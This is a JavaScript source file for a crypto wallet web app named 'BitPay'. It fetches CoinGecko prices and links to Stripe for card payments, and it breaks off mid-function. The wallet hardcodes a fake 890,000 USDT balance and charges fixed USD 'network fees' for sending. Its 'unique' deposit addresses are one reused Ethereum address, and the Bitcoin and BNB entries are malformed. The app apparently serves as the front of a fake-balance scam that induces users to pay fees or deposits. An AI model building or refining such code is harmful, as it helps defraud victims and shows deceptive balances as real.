/**
 * BitPay - Crypto Wallet
 * Uses CoinGecko API for prices, Stripe for payments
 */

const USDT_ETH_BALANCE = 890000;

// Stripe Payment Link - Create at https://dashboard.stripe.com/payment-links
// Replace with your Payment Link URL to accept card payments
const STRIPE_PAYMENT_LINK = 'https://buy.stripe.com/';

// APK download URL - Replace with your hosted APK after building (see DEPLOY.md)
const APK_DOWNLOAD_URL = 'https://www.pwabuilder.com';
const GAS_FEE_USD = 43.70;

// Per-network fixed USD fees for USDT sends
const NETWORK_FEE_USD = {
  ethereum: 43.70,
  tron: 18.30,
  bnb: 8.42,
  polygon: 4.32
};

function getNetworkFeeUsd(network) {
  return NETWORK_FEE_USD[network] ?? GAS_FEE_USD;
}

// Unique deposit addresses per blockchain
const DEPOSIT_ADDRESSES = {
  btc: 'bc1q742d35cc6634c0532925a3b844bc9e7595f8f3a',
  eth: '0x742d35Cc6634C0532925a3b844Bc9e7595f8f3a',
  sol: '7xKXtg2CW87d97TXJSDpbD5jBkheTqA83TZRuJosgAsU',
  bnb: 'bnb1q742d35cc6634c0532925a3b844bc9e7595f8f3a',
  usdt_ethereum: '0x742d35Cc6634C0532925a3b844Bc9e7595f8f3a',
  usdt_tron: 'TXYZopYRdj2D9XRtbG4dWNrj3d1dYdYdYdY',
  usdt_bnb: 'bnb1q742d35cc6634c0532925a3b844bc9e7595f8f3a',
  usdt_polygon: '0x742d35Cc6634C0532925a3b844Bc9e7595f8f3a'
};

// CoinGecko API (free, no API key required)
const COINGECKO_BASE = 'https://api.coingecko.com/api/v3';
const COIN_IDS = {
  btc: 'bitcoin',
  eth: 'ethereum',
  sol: 'solana',
  bnb: 'binancecoin',
  tron: 'tron',
  polygon: 'matic-network'
};
const NETWORK_NAMES = { btc: 'Bitcoin', eth: 'Ethereum', sol: 'Solana', bnb: 'BNB Chain' };

let cryptoChart = null;
let currentCryptoChain = null;

document.addEventListener('DOMContentLoaded', () => {
  initCopyAddress();
  initAssetRows();
  initSmoothScroll();
  initSendModal();
  initUsdtPopup();
  initCryptoPopup();
  initCryptoInfoShowMore();
  initDepositAddressModal();
  initBottomNav();
  initHeaderMenu();
  initDarkMode();
  initApkBanner();
  initPurchase();
});

// Copy wallet address to clipboard
function initCopyAddress() {
  const copyBtn = document.querySelector('.copy-btn');
  const addressText = document.querySelector('.address-text');
  if (copyBtn && addressText) {
    copyBtn.addEventListener('click', async () => {
      const fullAddress = '0x742d35Cc6634C0532925a3b844Bc9e7595f8f3a';
      try {
        await navigator.clipboard.writeText(fullAddress);
        showToast('Address copied!');
        copyBtn.innerHTML = `<svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="20 6 9 17 4 12"/></svg>`;
        setTimeout(() => {
          copyBtn.innerHTML = `<svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>`;
        }, 2000);
      } catch (err) {
        showToast('Could not copy', 'error');
      }
    });
  }
}

// Asset row click handlers
function initAssetRows() {
  const assetRows = document.querySelectorAll('.asset-row');

  assetRows.forEach(row => {
    row.addEventListener('click', (e) => {
      const chain = row.dataset.chain;
      const asset = row.dataset.asset;
      const name = row.querySelector('.asset-name')?.textContent || '';

      if (chain === 'usdt-erc20' || asset === 'usdt') {
        openUsdtPopup();
      } else if (['btc', 'eth', 'sol', 'bnb'].includes(chain)) {
        openCryptoPopup(chain, name, row.querySelector('.asset-logo')?.src);
      } else {
        showToast(`${name} – Deposit to get started.`);
      }
    });
  });
}

// USDT full-page popup
function initUsdtPopup() {
  const popup = document.getElementById('usdt-popup');
  const closeBtn = document.getElementById('close-usdt-popup');
  const cards = document.querySelectorAll('.blockchain-card');
  const depositBtns = document.querySelectorAll('.deposit-btn-blockchain');

  function closePopup() {
    popup.classList.remove('active');
    popup.setAttribute('aria-hidden', 'true');
    document.body.style.overflow = '';
  }

  // Card selection: only Ethereum shows 890k when selected; others show 0
  cards.forEach(card => {
    card.addEventListener('click', (e) => {
      if (e.target.closest('.deposit-btn-blockchain')) return;
      cards.forEach(c => c.classList.remove('selected'));
      card.classList.add('selected');
      const usdt = parseInt(card.dataset.usdt || '0', 10);
      const balanceEl = card.querySelector('[data-balance]');
      if (balanceEl) balanceEl.textContent = usdt > 0 ? `${usdt.toLocaleString()} USDT · $${usdt.toLocaleString()}` : '0 USDT';
      cards.forEach(c => {
        if (c !== card) {
          const be = c.querySelector('[data-balance]');
          if (be) be.textContent = '0 USDT';
        }
      });
    });
  });

  depositBtns.forEach(btn => {
    btn.addEventListener('click', (e) => {
      e.stopPropagation();
      const card = btn.closest('.blockchain-card');
      const network = card.dataset.network;
      const address = btn.dataset.address;
      const logo = card.dataset.logo || '';
      const labels = { ethereum: 'USDT · Ethereum (ERC-20)', tron: 'USDT · TRON (TRC-20)', bnb: 'USDT · BNB Chain (BEP-20)', polygon: 'USDT · Polygon' };
      openDepositAddressModal(labels[network], address, logo);
    });
  });

  if (closeBtn) closeBtn.addEventListener('click', closePopup);
  popup?.addEventListener('click', (e) => { if (e.target === popup) closePopup(); });
  document.addEventListener('keydown', (e) => {
    if (e.key === 'Escape' && popup?.classList.contains('active')) closePopup();
  });
}

function openUsdtPopup() {
  const popup = document.getElementById('usdt-popup');
  popup.classList.add('active');
  popup.setAttribute('aria-hidden', 'false');
  document.body.style.overflow = 'hidden';
  // Pre-select Ethereum with 890k
  const cards = document.querySelectorAll('.blockchain-card');
  cards.forEach(c => {
    c.classList.remove('selected');
    const be = c.querySelector('[data-balance]');
    const usdt = parseInt(c.dataset.usdt || '0', 10);
    if (be) be.textContent = usdt > 0 ? `${usdt.toLocaleString()} USDT · $${usdt.toLocaleString()}` : '0 USDT';
  });
  const ethCard = document.querySelector('.blockchain-card[data-network="ethereum"]');
  if (ethCard) {
    ethCard.classList.add('selected');
    const be = ethCard.querySelector('[data-balance]');
    if (be) be.textContent = '890,000 USDT · $890,000';
  }
}

// Crypto popup (BTC, ETH, SOL, BNB)
function initCryptoPopup() {
  const popup = document.getElementById('crypto-popup');
  const closeBtn = document.getElementById('close-crypto-popup');
  const copyBtn = document.getElementById('copy-crypto-address');
  const depositBtn = document.getElementById('crypto-deposit-btn');

  function closePopup() {
    popup.classList.remove('active');
    popup.setAttribute('aria-hidden', 'true');
    document.body.style.overflow = '';
    if (cryptoChart) {
      cryptoChart.destroy();
      cryptoChart = null;
    }
  }

  if (closeBtn) closeBtn.addEventListener('click', closePopup);
  popup?.addEventListener('click', (e) => { if (e.target === popup) closePopup(); });
  document.addEventListener('keydown', (e) => {
    if (e.key === 'Escape' && popup?.classList.contains('active')) closePopup();
  });

  if (copyBtn) {
    copyBtn.addEventListener('click', async () => {
      const addr = document.getElementById('crypto-deposit-address')?.textContent;
      if (!addr) return;
      try {
        await navigator.clipboard.writeText(addr);
        copyBtn.textContent = 'Copied!';
        showToast('Address copied');
        setTimeout(() => { copyBtn.textContent = 'Copy'; }, 2000);
      } catch {
        showToast('Could not copy', 'error');
      }
    });
  }

  document.getElementById('crypto-receive-btn')?.addEventListener('click', () => {
    if (!currentCryptoChain) return;
    const name = document.getElementById('crypto-popup-name')?.textContent || currentCryptoChain.toUpperCase();
    const addr = DEPOSIT_ADDRESSES[currentCryptoChain] || '';
    const logo = document.getElementById('crypto-popup-logo')?.src || '';
    if (addr) openDepositAddressModal(name, addr, logo);
  });

  document.getElementById('crypto-info-btn')?.addEventListener('click', () => {
    const name = document.getElementById('crypto-popup-name')?.textContent || 'Asset';
    showToast(`${name} – Price and chart from CoinGecko. Use only on official networks.`, 'success');
  });

  document.getElementById('crypto-buy-btn')?.addEventListener('click', () => {
    if (STRIPE_PAYMENT_LINK && STRIPE_PAYMENT_LINK !== 'https://buy.stripe.com/') {
      window.location.href = STRIPE_PAYMENT_LINK;
    } else {
      showToast('Configure STRIPE_PAYMENT_LINK for Buy', 'error');
    }
  });

  document.querySelectorAll('.chart-tab').forEach(tab => {
    tab.addEventListener('click', async () => {
      document.querySelectorAll('.chart-tab').forEach(t => t.classList.remove('active'));
      tab.classList.add('active');
      const days = tab.dataset.range === 'max' ? 'max' : Math.min(365, parseInt(tab.dataset.range, 10) || 90);
      if (!currentCryptoChain || !COIN_IDS[currentCryptoChain]) return;
      const coinId = COIN_IDS[currentCryptoChain];
      try {
        const url = days === 'max' ? `${COINGECKO_BASE}/coins/${coinId}/market_chart?vs_currency=usd&days=365` : `${COINGECKO_BASE}/coins/${coinId}/market_chart?vs_currency=usd&days=${days}`;
        const res = await fetch(url);
        const chartData = await res.json();
        renderCryptoChart(chartData);
      } catch (e) {
        console.warn('Chart fetch failed', e);
      }
    });
  });
}

async function openCryptoPopup(chain, name, logoUrl) {
  const popup = document.getElementById('crypto-popup');
  const nameEl = document.getElementById('crypto-popup-name');
  const logoEl = document.getElementById('crypto-popup-logo');
  const priceEl = document.getElementById('crypto-popup-price');
  const changeEl = document.getElementById('crypto-popup-change-text');
   const symbolEl = document.getElementById('crypto-popup-symbol');

  if (!popup) return;

  currentCryptoChain = chain;
  nameEl.textContent = name;
  if (symbolEl) {
    const symbolMap = { btc: 'BTC', eth: 'ETH', sol: 'SOL', bnb: 'BNB' };
    symbolEl.textContent = symbolMap[chain] || chain?.toUpperCase() || '—';
  }
  logoEl.src = logoUrl || '';
  logoEl.alt = name;
  priceEl.textContent = 'Loading...';
  if (changeEl) changeEl.textContent = '—';

  popup.classList.add('active');
  popup.setAttribute('aria-hidden', 'false');
  document.body.style.overflow = 'hidden';

  const coinId = COIN_IDS[chain];
  if (!coinId) return;

  try {
    const [priceRes, chartRes, detailRes] = await Promise.all([
      fetch(`${COINGECKO_BASE}/simple/price?ids=${coinId}&vs_currencies=usd&include_24hr_change=true`),
      fetch(`${COINGECKO_BASE}/coins/${coinId}/market_chart?vs_currency=usd&days=90`),
      fetch(`${COINGECKO_BASE}/coins/${coinId}`)
    ]);

    const priceData = await priceRes.json();
    const chartData = await chartRes.json();
    let detailData = null;
    try { detailData = await detailRes.json(); } catch (_) {}

    const price = priceData[coinId]?.usd;
    const change24h = priceData[coinId]?.usd_24h_change;
    if (typeof price === 'number') {
      priceEl.textContent = `$${price.toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: price >= 1 ? 2 : 6 })}`;
      if (changeEl && typeof change24h === 'number') {
        const sign = change24h >= 0 ? '+' : '';
        changeEl.textContent = `${sign}$${Math.abs(change24h).toFixed(2)} (${sign}${change24h.toFixed(2)}%)`;
        changeEl.className = 'crypto-price-change ' + (change24h >= 0 ? 'positive' : 'negative');
      }
    } else {
      priceEl.textContent = '—';
    }

    renderCryptoChart(chartData);
    fillCryptoInfo(chain, name, detailData);
  } catch (err) {
    console.warn('CoinGecko API error:', err);
    priceEl.textContent = '—';
    renderCryptoChart(null);
    fillCryptoInfo(chain, name, null);
  }
}

function stripHtml(html) {
  if (!html) return '';
  const div = document.createElement('div');
  div.innerHTML = html;
  return div.textContent || div.innerText || '';
}

function formatSupply(n) {
  if (n == null || isNaN(n)) return '—';
  if (n >= 1e9) return (n / 1e9).toFixed(2) + 'B';
  if (n >= 1e6) return (n / 1e6).toFixed(2) + 'M';
  if (n >= 1e3) return (n / 1e3).toFixed(2) + 'K';
  return String(n);
}

function formatMarketCap(n) {
  if (n == null || isNaN(n)) return '—';
  if (n >= 1e12) return '$' + (n / 1e12).toFixed(2) + 'T';
  if (n >= 1e9) return '$' + (n / 1e9).toFixed(2) + 'B';
  if (n >= 1e6) return '$' + (n / 1e6).toFixed(2) + 'M';
  return '$' + n.toLocaleString();
}

function fillCryptoInfo(chain, name, data) {
  const network = NETWORK_NAMES[chain] || name;
  document.getElementById('info-name').textContent = name;
  document.getElementById('info-symbol').textContent = (data?.symbol || chain).toUpperCase();
  document.getElementById('info-network').textContent = network;

  const md = data?.market_data;
  if (md) {
    document.getElementById('info-market-cap').textContent = formatMarketCap(md.market_cap?.usd);
    document.getElementById('info-total-supply').textContent = md.total_supply != null ? formatSupply(md.total_supply) : '—';
    document.getElementById('info-circulating-supply').textContent = md.circulating_supply != null ? formatSupply(md.circulating_supply) : '—';
  } else {
    document.getElementById('info-market-cap').textContent = '—';
    document.getElementById('info-total-supply').textContent = '—';
    document.getElementById('info-circulating-supply').textContent = '—';
  }

  const aboutEl = document.getElementById('crypto-about-text');
  const showMoreBtn = document.getElementById('crypto-show-more');
  let aboutText = '';
  if (data?.description?.en) aboutText = stripHtml(data.description.en);
  if (!aboutText) aboutText = getFallbackAbout(chain, name);
  aboutEl.textContent = aboutText;
  aboutEl.classList.add('truncated');
  aboutEl.dataset.fullText = aboutText;
  showMoreBtn.textContent = 'Show more';
  showMoreBtn.style.display = aboutText.length > 200 ? 'inline-block' : 'none';

  const website = data?.links?.homepage?.[0];
  const twitter = data?.links?.twitter_screen_name;
  const websiteBtn = document.getElementById('info-website');
  const twitterBtn = document.getElementById('info-twitter');
  websiteBtn.href = website || '#';
  websiteBtn.style.display = website ? 'inline-flex' : 'none';
  twitterBtn.href = twitter ? `https://x.com/${twitter}` : '#';
  twitterBtn.style.display = twitter ? 'inline-flex' : 'none';
}

function getFallbackAbout(chain, name) {
  const fallbacks = {
    btc: 'Bitcoin is the first decentralized cryptocurrency, created in 2009 by an unknown person or group using the pseudonym Satoshi Nakamoto. It enables peer-to-peer transactions without intermediaries.',
    eth: 'Ethereum is a decentralized platform that runs smart contracts. Created by Vitalik Buterin and others, it introduced programmable money and decentralized applications (dApps).',
    sol: 'Solana is a high-performance blockchain designed for scalability. It supports fast, low-cost transactions and is used for DeFi, NFTs, and Web3 applications.',
    bnb: 'BNB Chain (Binance Smart Chain) is a blockchain network built by Binance. It offers fast, low-cost transactions and is compatible with the Ethereum Virtual Machine.'
  };
  return fallbacks[chain] || `${name} is a major cryptocurrency and blockchain platform.`;
}

function initCryptoInfoShowMore() {
  const btn = document.getElementById('crypto-show-more');
  const textEl = document.getElementById('crypto-about-text');
  if (!btn || !textEl) return;
  btn.addEventListener('click', () => {
    if (textEl.classList.contains('truncated')) {
      textEl.classList.remove('truncated');
      textEl.textContent = textEl.dataset.fullText || textEl.textContent;
      btn.textContent = 'Show less';
    } else {
      textEl.classList.add('truncated');
      btn.textContent = 'Show more';
    }
  });
}

function renderCryptoChart(data) {
  const canvas = document.getElementById('crypto-chart');
  if (!canvas || typeof Chart === 'undefined') return;

  if (cryptoChart) {
    cryptoChart.destroy();
    cryptoChart = null;
  }

  const ctx = canvas.getContext('2d');
  let labels = [];
  let values = [];

  if (data && data.prices && Array.isArray(data.prices)) {
    const step = Math.max(1, Math.floor(data.prices.length / 60));
    const sampled = data.prices.filter((_, i) => i % step === 0);
    labels = sampled.map(([ts]) => new Date(ts).toLocaleDateString('en-US', { month: 'short', day: 'numeric' }));
    values = sampled.map(([, p]) => p);
  }

  cryptoChart = new Chart(ctx, {
    type: 'line',
    data: {
      labels,
      datasets: [{
        label: 'Price (USD)',
        data: values,
        borderColor: '#2563EB',
        backgroundColor: 'rgba(37, 99, 235, 0.1)',
        fill: true,
        tension: 0.3,
        pointRadius: 0,
        pointHoverRadius: 4
      }]
    },
    options: {
      responsive: true,
      maintainAspectRatio: false,
      plugins: {
        legend: { display: false }
      },
      scales: {
        x: {
          display: labels.length > 0,
          grid: { display: false },
          ticks: { maxTicksLimit: 6, font: { size: 10 } }
        },
        y: {
          display: true,
          grid: { color: 'rgba(0,0,0,0.05)' },
          ticks: { font: { size: 10 } }
        }
      }
    }
  });
}

// Deposit address modal (for USDT and crypto deposit buttons)
function initDepositAddressModal() {
  const modal = document.getElementById('deposit-address-modal');
  const closeBtn = document.getElementById('close-deposit-address-modal');
  const valueEl = document.getElementById('deposit-address-value');
  const copyBtn = document.getElementById('copy-deposit-address-value');

  function closeModal() {
    modal.classList.remove('active');
    modal.setAttribute('aria-hidden', 'true');
    document.body.style.overflow = '';
  }

  if (closeBtn) closeBtn.addEventListener('click', closeModal);
  modal?.addEventListener('click', (e) => { if (e.target === modal) closeModal(); });
  document.addEventListener('keydown', (e) => {
    if (e.key === 'Escape' && modal?.classList.contains('active')) closeModal();
  });

  if (copyBtn) {
    copyBtn.addEventListener('click', async () => {
      const addr = valueEl?.textContent;
      if (!addr) return;
      try {
        await navigator.clipboard.writeText(addr);
        copyBtn.innerHTML = '<svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="20 6 9 17 4 12"/></svg> Copied!';
        showToast('Address copied');
        setTimeout(() => {
          copyBtn.innerHTML = '<svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg> Copy Address';
        }, 2000);
      } catch {
        showToast('Could not copy', 'error');
      }
    });
  }
}

function openDepositAddressModal(title, address, logoUrl) {
  const modal = document.getElementById('deposit-address-modal');
  document.getElementById('deposit-address-network-badge').textContent = title;
  document.getElementById('deposit-address-value').textContent = address;
  const logoEl = document.getElementById('deposit-address-logo');
  const qrLogoEl = document.getElementById('receive-qr-logo');
  if (logoEl) {
    logoEl.src = logoUrl || '';
    logoEl.style.display = logoUrl ? 'block' : 'none';
  }
  if (qrLogoEl) {
    qrLogoEl.src = logoUrl || '';
    qrLogoEl.style.display = logoUrl ? 'block' : 'none';
  }
  const copyBtn = document.getElementById('copy-deposit-address-value');
  if (copyBtn) copyBtn.innerHTML = '<svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg> Copy Address';
  modal.classList.add('active');
  modal.setAttribute('aria-hidden', 'false');
  document.body.style.overflow = 'hidden';
  generateReceiveQR(address);
}

function generateReceiveQR(address) {
  const canvas = document.getElementById('receive-qr-canvas');
  if (!canvas || !address) return;
  const QR = window.QRCode || window.qrcode;
  if (!QR || !QR.toCanvas) return;
  const ctx = canvas.getContext('2d');
  ctx.clearRect(0, 0, canvas.width, canvas.height);
  QR.toCanvas(canvas, address, { width: 200, margin: 1, errorCorrectionLevel: 'H' }, function (err) {
    if (err) console.warn('QR generation failed', err);
  });
}

// Bottom nav tabs
function initBottomNav() {
  document.getElementById('view-all-activity')?.addEventListener('click', (e) => {
    e.preventDefault();
    document.querySelectorAll('.nav-item[data-tab]').forEach(n => n.classList.remove('active'));
    document.querySelector('.nav-item[data-tab="tab-activity"]')?.classList.add('active');
    document.querySelectorAll('.tab-pane').forEach(p => p.classList.remove('active'));
    document.getElementById('tab-activity')?.classList.add('active');
  });
  document.querySelectorAll('.nav-item[data-tab]').forEach(item => {
    item.addEventListener('click', (e) => {
      e.preventDefault();
      const tabId = item.dataset.tab;
      if (!tabId) return;
      document.querySelectorAll('.nav-item[data-tab]').forEach(n => n.classList.remove('active'));
      item.classList.add('active');
      document.querySelectorAll('.tab-pane').forEach(p => p.classList.remove('active'));
      const pane = document.getElementById(tabId);
      if (pane) pane.classList.add('active');
    });
  });
}

// Header dropdown menu
function initHeaderMenu() {
  const btn = document.getElementById('header-menu-btn');
  const dropdown = document.getElementById('header-menu-dropdown');
  if (!btn || !dropdown) return;
  btn.addEventListener('click', (e) => {
    e.stopPropagation();
    const open = dropdown.getAttribute('aria-hidden') !== 'true';
    dropdown.setAttribute('aria-hidden', open ? 'true' : 'false');
    btn.setAttribute('aria-expanded', !open);
  });
  document.addEventListener('click', () => {
    dropdown.setAttribute('aria-hidden', 'true');
    btn.setAttribute('aria-expanded', 'false');
  });
  dropdown.querySelectorAll('.menu-item').forEach(item => {
    item.addEventListener('click', (e) => {
      e.preventDefault();
      const action = item.dataset.action;
      dropdown.setAttribute('aria-hidden', 'true');
      if (action === 'settings') {
        document.querySelectorAll('.nav-item[data-tab]').forEach(n => n.classList.remove('active'));
        document.querySelector('.nav-item[data-tab="tab-settings"]')?.classList.add('active');
        document.querySelectorAll('.tab-pane').forEach(p => p.classList.remove('active'));
        document.getElementById('tab-settings')?.classList.add('active');
      } else if (action === 'lock') {
        showToast('Wallet locked', 'success');
      } else {
        showToast('Feature coming soon', 'success');
      }
    });
  });
}

// Dark mode
function initDarkMode() {
  const toggle = document.getElementById('dark-mode-toggle');
  const label = document.getElementById('theme-label');
  const saved = localStorage.getItem('theme');
  if (saved === 'dark') {
    document.body.classList.add('dark-theme');
    document.body.classList.remove('light-theme');
    if (toggle) toggle.checked = true;
    if (label) label.textContent = 'Dark mode';
  }
  toggle?.addEventListener('change', () => {
    const dark = toggle.checked;
    document.body.classList.toggle('dark-theme', dark);
    document.body.classList.toggle('light-theme', !dark);
    if (label) label.textContent = dark ? 'Dark mode' : 'Light mode';
    localStorage.setItem('theme', dark ? 'dark' : 'light');
  });
}

// Send - fullpage popup with blockchain selection
let currentSendAsset = 'USDT';
let currentSendNetwork = 'ethereum';
let currentSendBalance = 890000;

function initSendModal() {
  const sendModal = document.getElementById('send-popup');
  const stepAsset = document.getElementById('send-step-asset');
  const stepBlockchain = document.getElementById('send-step-blockchain');
  const stepForm = document.getElementById('send-step-form');
  const sendBtn = document.getElementById('send-btn');
  const navSendBtn = document.getElementById('nav-send-btn');
  const closeBtn = document.getElementById('close-send-modal');
  const cancelBtn = document.getElementById('cancel-send-btn');
  const backToAssetBtn = document.getElementById('send-back-to-asset');
  const backBtn = document.getElementById('send-back-btn');
  const recipientInput = document.getElementById('recipient-address');
  const amountInput = document.getElementById('send-amount');
  const maxBtn = document.getElementById('max-amount-btn');
  const confirmBtn = document.getElementById('confirm-send-btn');
  const sendTotalEl = document.getElementById('send-total');
  const sendAmountDisplay = document.getElementById('send-amount-display');
  const logoEl = document.getElementById('send-network-logo');
  const labelEl = document.getElementById('send-network-label');

  function openModal() {
    sendModal.classList.add('active');
    sendModal.setAttribute('aria-hidden', 'false');
    document.body.style.overflow = 'hidden';
    if (stepAsset) stepAsset.hidden = false;
    if (stepBlockchain) stepBlockchain.hidden = true;
    if (stepForm) stepForm.hidden = true;
    recipientInput.value = '';
    amountInput.value = '';
    recipientInput.classList.remove('error');
    amountInput.classList.remove('error');
    confirmBtn.disabled = true;
    sendTotalEl.textContent = '—';
    if (sendAmountDisplay) sendAmountDisplay.textContent = '—';
  }

  function closeModal() {
    sendModal.classList.remove('active');
    sendModal.setAttribute('aria-hidden', 'true');
    document.body.style.overflow = '';
  }

  document.getElementById('send-usdt-card')?.addEventListener('click', () => {
    if (stepAsset) stepAsset.hidden = true;
    if (stepBlockchain) stepBlockchain.hidden = false;
  });

  document.getElementById('send-eth-card')?.addEventListener('click', () => {
    currentSendAsset = 'ETH';
    currentSendNetwork = 'ethereum';
    currentSendBalance = 0;
    if (stepAsset) stepAsset.hidden = true;
    if (stepBlockchain) stepBlockchain.hidden = true;
    if (stepForm) stepForm.hidden = false;
    if (logoEl) {
      logoEl.src = 'https://assets.coingecko.com/coins/images/279/small/ethereum.png';
      logoEl.style.display = 'inline-block';
    }
    if (labelEl) labelEl.textContent = 'Ethereum · ETH';
    const amountLabel = document.getElementById('send-amount-label');
    if (amountLabel) amountLabel.textContent = 'Amount (ETH)';
    recipientInput.placeholder = '0x...';
    updateSendNetworkFeeNative();
    validateAndUpdate();
    setTimeout(() => recipientInput.focus(), 100);
  });

  document.getElementById('send-bnb-card')?.addEventListener('click', () => {
    currentSendAsset = 'BNB';
    currentSendNetwork = 'bnb';
    currentSendBalance = 0;
    if (stepAsset) stepAsset.hidden = true;
    if (stepBlockchain) stepBlockchain.hidden = true;
    if (stepForm) stepForm.hidden = false;
    if (logoEl) {
      logoEl.src = 'https://assets.coingecko.com/coins/images/825/small/bnb-icon2_2x.png';
      logoEl.style.display = 'inline-block';
    }
    if (labelEl) labelEl.textContent = 'BNB Chain · BNB';
    const amountLabel = document.getElementById('send-amount-label');
    if (amountLabel) amountLabel.textContent = 'Amount (BNB)';
    recipientInput.placeholder = '0x...';
    updateSendNetworkFeeNative();
    validateAndUpdate();
    setTimeout(() => recipientInput.focus(), 100);
  });

  document.getElementById('send-sol-card')?.addEventListener('click', () => {
    currentSendAsset = 'SOL';
    currentSendNetwork = 'solana';
    currentSendBalance = 0;
    if (stepAsset) stepAsset.hidden = true;
    if (stepBlockchain) stepBlockchain.hidden = true;
    if (stepForm) stepForm.hidden = false;
    if (logoEl) {
      logoEl.src = 'https://assets.coingecko.com/coins/images/4128/small/solana.png';
      logoEl.style.display = 'inline-block';
    }
    if (labelEl) labelEl.textContent = 'Solana · SOL';
    const amountLabel = document.getElementById('send-amount-label');
    if (amountLabel) amountLabel.textContent = 'Amount (SOL)';
    recipientInput.placeholder = 'Solana address';
    updateSendNetworkFeeNative();
    validateAndUpdate();
    setTimeout(() => recipientInput.focus(), 100);
  });

  document.getElementById('send-polygon-card')?.addEventListener('click', () => {
    currentSendAsset = 'MATIC';
    currentSendNetwork = 'polygon';
    currentSendBalance = 0;
    if (stepAsset) stepAsset.hidden = true;
    if (stepBlockchain) stepBlockchain.hidden = true;
    if (stepForm) stepForm.hidden = false;
    if (logoEl) {
      logoEl.src = 'https://assets.coingecko.com/coins/images/4713/small/matic-token-icon.png';
      logoEl.style.display = 'inline-block';
    }
    if (labelEl) labelEl.textContent = 'Polygon · MATIC';
    const amountLabel = document.getElementById('send-amount-label');
    if (amountLabel) amountLabel.textContent = 'Amount (MATIC)';
    recipientInput.placeholder = '0x...';
    updateSendNetworkFeeNative();
    validateAndUpdate();
    setTimeout(() => recipientInput.focus(), 100);
  });

  if (backToAssetBtn) backToAssetBtn.addEventListener('click', () => {
    if (stepAsset) stepAsset.hidden = false;
    if (stepBlockchain) stepBlockchain.hidden = true;
  });

  document.querySelectorAll('.send-blockchain-option').forEach(opt => {
    opt.addEventListener('click', () => {
      currentSendAsset = 'USDT';
      currentSendNetwork = opt.dataset.network || 'ethereum';
      currentSendBalance = parseInt(opt.dataset.balance || '0', 10);
      if (stepBlockchain) stepBlockchain.hidden = true;
      if (stepForm) stepForm.hidden = false;
      if (logoEl) {
        logoEl.src = opt.dataset.logo || '';
        logoEl.style.display = opt.dataset.logo ? 'inline-block' : 'none';
      }
      if (labelEl) labelEl.textContent = opt.dataset.label || '';
      const amountLabel = document.getElementById('send-amount-label');
      if (amountLabel) amountLabel.textContent = 'Amount (USDT)';
      recipientInput.placeholder = currentSendNetwork === 'tron' ? 'T...' : '0x...';
      const balance = parseInt(opt.dataset.balance || '0', 10);
      updateSendNetworkFeeNative();
      validateAndUpdate();
      setTimeout(() => recipientInput.focus(), 100);
    });
  });

  if (backBtn) backBtn.addEventListener('click', () => {
    if (stepBlockchain) stepBlockchain.hidden = false;
    if (stepForm) stepForm.hidden = true;
  });

  function isValidAddress(addr, network) {
    if (!addr) return false;
    if (network === 'ethereum' || network === 'bnb' || network === 'polygon') return /^0x[a-fA-F0-9]{40}$/.test(addr);
    if (network === 'bitcoin') return /^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,89}$/.test(addr);
    if (network === 'solana') return addr.length >= 32 && addr.length <= 44;
    if (network === 'tron') return addr.startsWith('T') && addr.length === 34;
    return addr.length > 10;
  }

  function parseAmount(val) {
    const n = parseFloat(String(val).replace(/[^0-9.]/g, ''));
    return isNaN(n) ? 0 : n;
  }

  async function updateSendNetworkFeeNative() {
    const feeEl = document.getElementById('send-network-fee-eth');
    if (!feeEl || !currentSendNetwork) return;

    const network = currentSendNetwork;
    const feeUsd = getNetworkFeeUsd(network);
    const tokenMeta = {
      ethereum: { id: 'ethereum', symbol: 'ETH' },
      tron: { id: 'tron', symbol: 'TRX' },
      bnb: { id: 'binancecoin', symbol: 'BNB' },
      polygon: { id: 'matic-network', symbol: 'MATIC' }
    }[network];

    if (!tokenMeta) {
      feeEl.textContent = '—';
      return;
    }

    feeEl.textContent = '…';

    try {
      const res = await fetch(`${COINGECKO_BASE}/simple/price?ids=${tokenMeta.id}&vs_currencies=usd`);
      const data = await res.json();
      const priceUsd = data?.[tokenMeta.id]?.usd;
      if (typeof priceUsd === 'number' && priceUsd > 0) {
        const amountToken = feeUsd / priceUsd;
        const formatted =
          amountToken >= 0.01 ? amountToken.toFixed(3) : amountToken.toFixed(5);
        feeEl.textContent = `${formatted} ${tokenMeta.symbol}`;
      } else {
        feeEl.textContent = '—';
      }
    } catch (e) {
      console.warn('Fee token price fetch failed', e);
      feeEl.textContent = '—';
    }
  }

  function validateAndUpdate() {
    const addr = (recipientInput.value || '').trim();
    const amount = parseAmount(amountInput.value);
    const addrValid = isValidAddress(addr, currentSendNetwork);
    const maxAmount = currentSendAsset === 'USDT' ? currentSendBalance : 999999999;
    const amountValid = amount > 0 && amount <= maxAmount;

    recipientInput.classList.toggle('error', addr && !addrValid);
    amountInput.classList.toggle('error', amountInput.value && !amountValid);
    confirmBtn.disabled = !(addrValid && amountValid);

    if (amountValid) {
      const feeUsd = currentSendAsset === 'USDT' ? getNetworkFeeUsd(currentSendNetwork) : 0;
      const totalUsd = amount + feeUsd;
      if (sendAmountDisplay) sendAmountDisplay.textContent = `${amount.toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 6 })} ${currentSendAsset}`;
      sendTotalEl.textContent = currentSendAsset === 'USDT' ? `$${totalUsd.toLocaleString(undefined, { minimumFractionDigits: 2 })}` : `${amount.toLocaleString()} ${currentSendAsset}`;
    } else {
      sendTotalEl.textContent = '—';
      if (sendAmountDisplay) sendAmountDisplay.textContent = '—';
    }
  }

  function onConfirm() {
